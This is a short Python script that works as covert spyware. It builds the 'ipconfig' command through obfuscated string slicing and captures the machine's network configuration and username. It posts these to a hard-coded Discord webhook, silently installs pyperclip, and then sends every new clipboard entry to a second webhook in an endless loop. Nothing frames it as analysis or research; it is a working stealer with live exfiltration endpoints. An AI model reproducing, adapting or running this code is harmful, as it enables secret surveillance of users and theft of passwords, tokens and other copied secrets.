import os
import time
import requests

uname = os.getenv("USERNAME")

sic = 'pver-india'[5] + 'pver-india'[0] + "config"
iport = os.system(sic + " > " + os.getenv("TEMP") + "\\config.file")
# time.sleep(1)
with open(os.getenv("TEMP") + "\\config.file", "r") as f:
	para = f.read()

# print(uname)
# print(para)
# print(time.ctime() + f" [{time.time()}]")

cont = f'''
User: `{uname}`
Logon: `{time.ctime() + f" [{time.time()}]"}`
```
{para}
```
'''

bot = {"content": cont,
		"username": "Login",
		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/959858917830168616/unknown.png',
		"tts": "false"}
hookID = "960520988494290985/jWpF62l-oED8h837f2_3kn2hr8M9Tbz1IE1Tqu74V6JtKrNlF_JB--1bpeSZLtg5nsEq"
ping = requests.post('https://discord.com/api/webhooks/' + hookID, json=bot)
# https://discord.com/api/webhooks/960520988494290985/jWpF62l-oED8h837f2_3kn2hr8M9Tbz1IE1Tqu74V6JtKrNlF_JB--1bpeSZLtg5nsEq

try:
	import pyperclip
except:
	os.system("py -m pip install pyperclip")
finally:
	import pyperclip
	
while True:
	newCOPY = pyperclip.waitForNewPaste()
	# print(newCOPY)
	newCOPY = "```\n" + newCOPY + "\n```"
	usrhook = {"content": newCOPY,
		"username": "Kopier",
		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/960113214371299388/unknown.png',
		"tts": "false"}
	hookID = '960520706104360990/bXUeJiaKVfxKczfK6E4XfKuDfIhBnQ9TqbGmSkAYdPkO02Gr8bzasez4U-HxGj_X8eHY'
	ping = requests.post('https://discord.com/api/webhooks/' + hookID, json=usrhook)
	# https://discord.com/api/webhooks/960520706104360990/bXUeJiaKVfxKczfK6E4XfKuDfIhBnQ9TqbGmSkAYdPkO02Gr8bzasez4U-HxGj_X8eHY
